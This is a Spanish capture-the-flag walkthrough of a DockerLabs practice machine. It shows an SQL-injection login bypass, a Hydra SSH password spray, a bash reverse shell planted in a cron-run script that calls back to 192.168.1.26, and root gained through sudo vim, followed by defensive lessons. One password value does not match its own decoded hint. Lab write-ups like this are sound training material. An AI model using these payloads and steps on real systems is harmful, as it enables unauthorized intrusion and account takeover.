# Internship — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** s1egfr1ed  
**Fecha de creación:** 13/02/2025  
**Técnicas:** SQL Injection · Dirb · Hydra · SSH · Reverse Shell · Steghide · Vim sudo abuse

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — GateKeeper HR](#2-enumeración-web--gatekeeper-hr)
3. [SQL Injection — bypass login](#3-sql-injection--bypass-login)
4. [Dirb — descubrimiento de /spam](#4-dirb--descubrimiento-de-spam)
5. [Fuerza bruta SSH — usuario pedro](#5-fuerza-bruta-ssh--usuario-pedro)
6. [Movimiento lateral — usuario valentina](#6-movimiento-lateral--usuario-valentina)
7. [Escalada de privilegios — vim sudo](#7-escalada-de-privilegios--vim-sudo)
8. [Lección aprendida](#8-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh internship.tar
```

> IP asignada: `172.17.0.2`

Escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

---

## 2. Enumeración web — GateKeeper HR

Accedemos al servidor web y observamos una aplicación llamada **GateKeeper HR**.

El código fuente revela un dominio interno:

```text
gatekeeperhr.com
```

Añadimos el dominio al fichero `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

```text
172.17.0.2 gatekeeperhr.com
```

Ahora la web carga correctamente utilizando el dominio.

---

## 3. SQL Injection — bypass login

El formulario de login es vulnerable a SQL Injection.

Payload utilizado:

```sql
' OR 1=1-- -
```

Tras acceder obtenemos una lista de usuarios del sistema.

Creamos un fichero con los nombres:

```bash
nano users.txt
```

```text
ana
carlos
maria
juan
laura
pedro
sofia
diego
valentina
alejandro
```

---

## 4. Dirb — descubrimiento de /spam

Enumeramos directorios:

```bash
dirb http://gatekeeperhr.com/
```

Encontramos:

```text
/spam
```

La página aparece completamente negra, pero inspeccionando el código fuente vemos un comentario oculto:

```html
<!-- Yn pbagenfrrn qr hab qr ybf cnfnagf rf 'checy3' -->
```

Después de buscar el texto obtenemos la contraseña:

```text
purcl3
```

---

## 5. Fuerza bruta SSH — usuario pedro

Utilizamos Hydra con la lista de usuarios encontrada:

```bash
hydra -L users.txt -p purcl3 ssh://172.17.0.2
```

Resultado:

```text
login: pedro
password: purcl3
```

Accedemos:

```bash
ssh pedro@172.17.0.2
```

Dentro encontramos una flag.

---

## 6. Movimiento lateral — usuario valentina

Listamos procesos:

```bash
ps aux
```

Observamos que el usuario `valentina` ejecuta periódicamente:

```text
/opt/log_cleaner.sh
```

Editamos el script para insertar una reverse shell.

Payload:

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.26/443 0>&1
```

Nos ponemos en escucha:

```bash
sudo nc -lvnp 443
```

Esperamos a que el proceso automático ejecute el script y obtenemos acceso como `valentina`.

Dentro del usuario encontramos:

```text
profile_picture.jpeg
```

Copiamos la imagen:

```bash
scp pedro@172.17.0.2:/tmp/profile_picture.jpeg .
```

Extraemos contenido oculto:

```bash
steghide extract -sf profile_picture.jpeg
```

Se genera:

```text
secret.txt
```

Contenido:

```text
mag1ck
```

Probamos la contraseña:

```bash
ssh valentina@172.17.0.2
```

Acceso correcto.

---

## 7. Escalada de privilegios — vim sudo

Comprobamos permisos sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/vim
```

Utilizamos GTFOBins:

```bash
sudo /usr/bin/vim -c ':!/bin/sh'
```

```bash
whoami
root
```

✅ Somos **root**.

---

## 8. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| SQL Injection en login | Acceso inicial |
| Comentarios ocultos en HTML | Filtración de contraseña |
| Contraseña reutilizada | Acceso SSH |
| Script editable ejecutado automáticamente | Movimiento lateral |
| Esteganografía insegura | Exposición de credenciales |
| sudo sobre vim | Escalada a root |

**Para defenderse:**

- Sanitizar entradas frente a SQL Injection.
- No ocultar credenciales en comentarios HTML.
- Evitar reutilización de contraseñas.
- Restringir permisos sobre scripts automáticos.
- No conceder acceso sudo a binarios peligrosos como vim.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
